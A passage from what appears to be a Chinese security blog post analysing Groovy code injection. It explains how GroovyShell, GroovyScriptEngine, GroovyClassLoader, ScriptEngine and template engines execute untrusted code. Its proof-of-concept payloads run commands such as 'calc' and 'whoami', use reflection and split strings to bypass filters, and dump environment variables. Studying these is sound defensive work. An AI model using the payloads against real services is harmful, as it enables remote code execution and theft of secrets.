+<li><a href="https://blog.csdn.net/SKI_12/article/details/63684778" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/64906997" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/66473045" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301318" target="_blank" rel="noopener">(旧博客)渗透测试之漏洞扫描阶段</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57405291" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统下隐藏痕迹的小技巧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57403811" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统中的一些信息收集方法</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76598873" target="_blank" rel="noopener">(旧博客)使用Kali无线渗透获取宿舍WiFi密码（WPA）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62239673" target="_blank" rel="noopener">(旧博客)关于Kali的两个Webshell（Webacoo和Weevely）的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62064984" target="_blank" rel="noopener">(旧博客)关于Kali获取HTTP账号密码的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62045632" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP欺骗的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61926977" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP攻击的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61920179" target="_blank" rel="noopener">(旧博客)在Kali中安装IBus的拼音输入法</a></li>
+<li></li>
+</ul>
+</li>
+<li>Metasploit<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60881390" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（一）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62427016" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（二）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/77103290" target="_blank" rel="noopener">(旧博客)Metasploit的Docker安装及其Eternal Blue（永恒之蓝）渗透实现</a></li>
+</ul>
+</li>
+<li>内网渗透<ul>
+<li><a href="/2020/02/15/内网渗透基础/">内网渗透基础与域环境搭建</a></li>
+<li><a href="/2020/02/18/Windows-PowerShell基础/">内网渗透之Windows PowerShell基础</a></li>
+<li><a href="/2020/02/27/内网信息收集之本机信息收集/">内网信息收集之本机信息收集</a></li>
+<li><a href="/2020/03/08/内网信息收集之域相关信息收集/">内网信息收集之域相关信息收集</a></li>
+</ul>
+</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78333085" target="_blank" rel="noopener">(旧博客)Wireshark进阶之网络问题案例分析</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61651960" target="_blank" rel="noopener">(旧博客)关于nmap所有的参数</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60332892" target="_blank" rel="noopener">(旧博客)关于Xsser的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60151041" target="_blank" rel="noopener">(旧博客)关于skipfish的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/58677137" target="_blank" rel="noopener">(旧博客)关于Vega的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/58188331" target="_blank" rel="noopener">(旧博客)关于SQLMAP所有参数的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57418307" target="_blank" rel="noopener">(旧博客)关于NETCAT的学习笔记</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78716967" target="_blank" rel="noopener">(旧博客)Windows系统安全小结</a></li>
+</ul>
+</li>
+<li>Linux<ul>
+<li><a href="/2020/03/28/Linux安全笔记/">Linux安全笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78169962" target="_blank" rel="noopener">(旧博客)Linux查找命令小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/72614754" target="_blank" rel="noopener">(旧博客)关于iptables防火墙的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63680773" target="_blank" rel="noopener">(旧博客)关于Linux日志的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78837765" target="_blank" rel="noopener">(旧博客)Ubuntu搭建MongoDB集群</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><strong>云</strong><ul>
+<li>云安全</li>
+<li>Docker<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76696436" target="_blank" rel="noopener">(旧博客)Docker基本命令以及Ubuntu16.04更换源</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76713869" target="_blank" rel="noopener">(旧博客)使用Docker搭建基于MySQL、Apache和PHP的DVWA服务器</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+</div>
+
+<header class="post-header text-center">
+	<h1 class="title">
+		浅析Groovy代码注入漏洞
+	</h1>
+	<span class="read">
+		阅读量 <span id="busuanzi_value_page_pv"></span>
+	</span>
+</header><br>
+
+<div class="book-post">
+  <h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="Groovy简介"><a href="#Groovy简介" class="headerlink" title="Groovy简介"></a>Groovy简介</h3><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy代码能够与Java代码很好地结合，也能用于扩展现有代码。由于其运行在JVM上的特性，Groovy也可以使用其他非Java语言编写的库。</p>
+<p>Groovy是用于Java虚拟机的一种敏捷的动态语言，它是一种成熟的面向对象编程语言，既可以用于面向对象编程，又可以用作纯粹的脚本语言。使用该种语言不必编写过多的代码，同时又具有闭包和动态语言中的其他特性。</p>
+<p>Groovy是JVM的一个替代语言（替代是指可以用Groovy在Java平台上进行Java编程），使用方式基本与使用Java代码的方式相同，该语言特别适合与Spring的动态语言支持一起使用，设计时充分考虑了Java集成，这使Groovy与Java代码的互操作很容易。（注意：不是指Groovy替代Java，而是指Groovy和Java很好的结合编程。）</p>
+<p>Groovy有以下特点：</p>
+<ul>
+<li>同时支持静态和动态类型；</li>
+<li>支持运算符重载；</li>
+<li>本地语法列表和关联数组；</li>
+<li>对正则表达式的本地支持；</li>
+<li>各种标记语言，如XML和HTML原生支持；</li>
+<li>Groovy对于Java开发人员来说很简单，因为Java和Groovy的语法非常相似；</li>
+<li>可以使用现有的Java库；</li>
+<li>Groovy扩展了java.lang.Object；</li>
+</ul>
+<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>参考：<a href="https://www.w3cschool.cn/groovy/" target="_blank" rel="noopener">https://www.w3cschool.cn/groovy/</a></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载Groovy：<a href="http://groovy-lang.org/download.html" target="_blank" rel="noopener">http://groovy-lang.org/download.html</a></p>
+<p>解压之后，使用IDEA新建Groovy项目时选择解压的Groovy目录即可。然后点击src-&gt;new&gt;groovy class，即可新建一个groovy文件，内容如下：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> &#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> main(args)&#123;</span><br><span class="line">        println <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="5种运行方式"><a href="#5种运行方式" class="headerlink" title="5种运行方式"></a>5种运行方式</h3><h4 id="groovyConsole图形交互控制台"><a href="#groovyConsole图形交互控制台" class="headerlink" title="groovyConsole图形交互控制台"></a>groovyConsole图形交互控制台</h4><p>在终端下输入<code>groovyConsole</code>启动图形交互控制台，在上面可以直接编写代码执行：</p>
+<p><img src="/2020/03/24/浅析Groovy代码注入漏洞/1.png" alt=""></p>
+<h4 id="groovysh-shell命令交互"><a href="#groovysh-shell命令交互" class="headerlink" title="groovysh shell命令交互"></a>groovysh shell命令交互</h4><p>在终端下输入<code>groovysh</code>启动一个shell命令行来执行Groovy代码的交互：</p>
+<p><img src="/2020/03/24/浅析Groovy代码注入漏洞/2.png" alt=""></p>
+<h4 id="用命令行执行Groovy脚本"><a href="#用命令行执行Groovy脚本" class="headerlink" title="用命令行执行Groovy脚本"></a>用命令行执行Groovy脚本</h4><p>在GROOVY_HOME\bin里有个叫“groovy”或“groovy.bat”的脚本文件，可以类似<code>python test.py</code>这种方式来执行Groovy脚本。</p>
+<p>1.groovy：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println(<span class="string">"mi1k7ea"</span>)</span><br></pre></td></tr></table></figure>
+<p>在Windows运行<code>groovy.bat 1.groovy</code>即可执行该Groovy脚本：</p>
+<p><img src="/2020/03/24/浅析Groovy代码注入漏洞/3.png" alt=""></p>
+<h4 id="通过IDE运行Groovy脚本"><a href="#通过IDE运行Groovy脚本" class="headerlink" title="通过IDE运行Groovy脚本"></a>通过IDE运行Groovy脚本</h4><p>有一个叫GroovyShell的类含有main(String[])方法可以运行任何Groovy脚本。</p>
+<p>在前面的IDEA中可以直接运行Groovy脚本：</p>
+<p><img src="/2020/03/24/浅析Groovy代码注入漏洞/4.png" alt=""></p>
+<p>当然，也可以在Java环境中通过groovy-all.jar中的groovy.lang.GroovyShell类来运行Groovy脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp groovy-all-2.4.12.jar groovy.lang.GroovyShell 1.groovy</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/24/浅析Groovy代码注入漏洞/5.png" alt=""></p>
+<h4 id="用Groovy创建Unix脚本"><a href="#用Groovy创建Unix脚本" class="headerlink" title="用Groovy创建Unix脚本"></a>用Groovy创建Unix脚本</h4><p>你可以用Groovy编写Unix脚本并且像Unix脚本一样直接从命令行运行它.倘若你安装的是二进制分发包并且设置好环境变量,那么下面的代码将会很好的工作。</p>
+<p>编写一个类似如下的脚本文件，保存为：HelloGroovy</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env groovy</span></span><br><span class="line">println(<span class="string">"this is groovy script"</span>)</span><br><span class="line">println(<span class="string">"Hi,"</span>+args[<span class="number">0</span>]+<span class="string">" welcome to Groovy"</span>)</span><br></pre></td></tr></table></figure>
+<p>然后在命令行下执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x HelloGroovy</span><br><span class="line">$ ./HelloGroovy micmiu.com</span><br><span class="line">this is groovy script</span><br><span class="line">Hi,micmiu.com welcome to Groovy</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Groovy代码注入漏洞"><a href="#0x02-Groovy代码注入漏洞" class="headerlink" title="0x02 Groovy代码注入漏洞"></a>0x02 Groovy代码注入漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>我们知道，Groovy是一种强大的编程语言，其强大的功能包括了危险的命令执行等调用。</p>
+<p>在目标服务中，如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，且程序并未对输入的Groovy代码进行有效的过滤，那么会导致恶意的Groovy代码注入，从而RCE。</p>
+<p>如下代码简单地执行命令：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> &#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> main(args)&#123;</span><br><span class="line">        <span class="keyword">def</span> cmd = <span class="string">"calc"</span>;</span><br><span class="line">        println <span class="string">"$&#123;cmd.execute()&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这段Groovy代码被执行就会弹计算器：</p>
+<p><img src="/2020/03/24/浅析Groovy代码注入漏洞/6.png" alt=""></p>
+<h3 id="几种PoC变通形式"><a href="#几种PoC变通形式" class="headerlink" title="几种PoC变通形式"></a>几种PoC变通形式</h3><p>Groovy代码注入实现命令执行有以下几种变通的形式：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line"><span class="string">"calc"</span>.execute()</span><br><span class="line"><span class="string">'calc'</span>.execute()</span><br><span class="line"><span class="string">"$&#123;"</span>calc<span class="string">".execute()&#125;"</span></span><br><span class="line"><span class="string">"$&#123;'calc'.execute()&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br><span class="line">println <span class="string">'whoami'</span>.execute().text</span><br><span class="line">println <span class="string">"$&#123;"</span>whoami<span class="string">".execute().text&#125;"</span></span><br><span class="line">println <span class="string">"$&#123;'whoami'.execute().text&#125;"</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">"whoami"</span>;</span><br><span class="line">println <span class="string">"$&#123;cmd.execute().text&#125;"</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>在下面一些场景中，会触发Groovy代码注入漏洞。</p>
+<h4 id="GroovyShell"><a href="#GroovyShell" class="headerlink" title="GroovyShell"></a>GroovyShell</h4><p>GroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值。</p>
+<p>GroovyShellExample.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyShellExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">        GroovyShell groovyShell = <span class="keyword">new</span> GroovyShell();</span><br><span class="line">        groovyShell.evaluate(<span class="string">"\"calc\".execute()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接运行即可弹计算器：</p>
+<p><img src="/2020/03/24/浅析Groovy代码注入漏洞/7.png" alt=""></p>
+<p>或者换成运行Groovy脚本的方式也是也一样的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.Script;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyShellExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyShell groovyShell = <span class="keyword">new</span> GroovyShell();</span><br><span class="line">        Script script = groovyShell.parse(<span class="keyword">new</span> File(<span class="string">"src/test.groovy"</span>));</span><br><span class="line">        script.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>test.groovy：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br></pre></td></tr></table></figure>
+<p>此外，可使用Binding对象输入参数给表达式，并最终通过GroovyShell返回Groovy表达式的计算结果。</p>
+<h4 id="GroovyScriptEngine"><a href="#GroovyScriptEngine" class="headerlink" title="GroovyScriptEngine"></a>GroovyScriptEngine</h4><p>GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。如同GroovyShell一样，GroovyScriptEngine也允许传入参数值，并能返回脚本的计算值。</p>
+<p>GroovyScriptEngineExample.java，直接运行即加载Groovy脚本文件实现命令执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.Binding;</span><br><span class="line"><span class="keyword">import</span> groovy.util.GroovyScriptEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyScriptEngine groovyScriptEngine = <span class="keyword">new</span> GroovyScriptEngine(<span class="string">""</span>);</span><br><span class="line">        groovyScriptEngine.run(<span class="string">"src/test.groovy"</span>,<span class="keyword">new</span> Binding());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>test.groovy脚本文件如之前。</p>
+<h4 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h4><p>GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类。</p>
+<p>GroovyClassLoaderExample.java，直接运行即加载Groovy脚本文件实现命令执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyClassLoader;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyClassLoaderExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyClassLoader groovyClassLoader = <span class="keyword">new</span> GroovyClassLoader();</span><br><span class="line">        Class loadClass = groovyClassLoader.parseClass(<span class="keyword">new</span> File(<span class="string">"src/test.groovy"</span>));</span><br><span class="line">        GroovyObject groovyObject = (GroovyObject) loadClass.newInstance();</span><br><span class="line">        groovyObject.invokeMethod(<span class="string">"main"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>test.groovy脚本文件如之前。</p>
+<h4 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h4><p>ScriptEngine脚本引擎是被设计为用于数据交换和脚本执行的。</p>
+<ul>
+<li>数据交换：表现在调度引擎的时候，允许将数据输入/输出引擎，至于引擎内的数据持有的具体方式有两种：普通的键值对和Bindings（interface Bindings extends Map&lt;String,Object&gt;）；</li>
+<li>脚本执行：脚本引擎执行表现为调用eval()；</li>
+</ul>
+<p>ScriptEngineManager类是一个脚本引擎的管理类，用来创建脚本引擎，大概的方式就是在类加载的时候通过SPI的方式，扫描ClassPath中已经包含实现的所有ScriptEngineFactory，载入后用来负责生成具体的ScriptEngine。</p>
+<p>在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。这点和在SpEL表达式注入漏洞中讲到的同样是利用ScriptEngine支持JS引擎从而实现绕过达到RCE是一样的。</p>
+<p>ScriptEngineExample.java，直接运行即命令执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine groovyEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"groovy"</span>);</span><br><span class="line">        groovyEngine.eval(<span class="string">"\"calc\".execute()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行Groovy脚本，需要实现读取文件内容的接口而不能直接传入File类对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine groovyEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"groovy"</span>);</span><br><span class="line">        String code = readfile(<span class="string">"src/test.groovy"</span>);</span><br><span class="line">        groovyEngine.eval(code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readfile</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(filename));</span><br><span class="line">        String string = <span class="string">""</span>;</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">while</span> ((str = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            string = string + str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>test.groovy脚本文件如之前。</p>
+<h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><p>Groovy语言包含了一个模板引擎功能，可以生成各种类型的格式化文件，非常方便。模板引擎有下面几个，它们<br>都实现了Template接口。</p>
+<ul>
+<li>SimpleTemplateEngine：基本的模板</li>
+<li>StreamingTemplateEngine：功能和 SimpleTemplateEngine相同，不过支持大于64k的模板</li>
+<li>GStringTemplateEngine：将模板保存为可写的闭包，在流式场景中很有用</li>
+<li>XmlTemplateEngine：输出XML文件的模板引擎</li>
+<li>MarkupTemplateEngine：一个完整的、优化过的模板引擎，可以用于生成HTML等模板</li>
+</ul>
+<p>场景：</p>
+<ul>
+<li>整个模板可控</li>
+<li>模板使用拼接的方式生成，内容部分可控</li>
+</ul>
+<h2 id="0x03-漏洞利用Tricks"><a href="#0x03-漏洞利用Tricks" class="headerlink" title="0x03 漏洞利用Tricks"></a>0x03 漏洞利用Tricks</h2><h3 id="利用反射机制和字符串拼接Bypass"><a href="#利用反射机制和字符串拼接Bypass" class="headerlink" title="利用反射机制和字符串拼接Bypass"></a>利用反射机制和字符串拼接Bypass</h3><p>直接的命令执行在前面已经说过几种形式了：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line"><span class="string">"calc"</span>.execute()</span><br><span class="line"><span class="string">'calc'</span>.execute()</span><br><span class="line"><span class="string">"$&#123;"</span>calc<span class="string">".execute()&#125;"</span></span><br><span class="line"><span class="string">"$&#123;'calc'.execute()&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br><span class="line">println <span class="string">'whoami'</span>.execute().text</span><br><span class="line">println <span class="string">"$&#123;"</span>whoami<span class="string">".execute().text&#125;"</span></span><br><span class="line">println <span class="string">"$&#123;'whoami'.execute().text&#125;"</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">"whoami"</span>;</span><br><span class="line">println <span class="string">"$&#123;cmd.execute().text&#125;"</span>;</span><br></pre></td></tr></table></figure>
+<p>在某些场景下，程序可能会过滤输入内容，此时可以通过反射机制以及字符串拼接的方式来绕过实现命令执行：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line">Class&lt;?&gt; rt = Class.forName("java.la" + "ng.Run" + "time");</span><br><span class="line">Method gr = rt.getMethod("getR" + "untime");</span><br><span class="line">Method ex = rt.getMethod("ex" + "ec", String.class);</span><br><span class="line">ex.invoke(gr.invoke(null), "ca" + "lc")</span><br></pre></td></tr></table></figure>
+<h3 id="窃取环境变量信息"><a href="#窃取环境变量信息" class="headerlink" title="窃取环境变量信息"></a>窃取环境变量信息</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> env = System.getenv()</span><br><span class="line">println <span class="string">"$&#123;env&#125;"</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/24/浅析Groovy代码注入漏洞/8.png" alt=""></p>
+<h3 id="枚举文件和文件夹"><a href="#枚举文件和文件夹" class="headerlink" title="枚举文件和文件夹"></a>枚举文件和文件夹</h3><p>枚举指定目录下的文件及文件夹：</p>
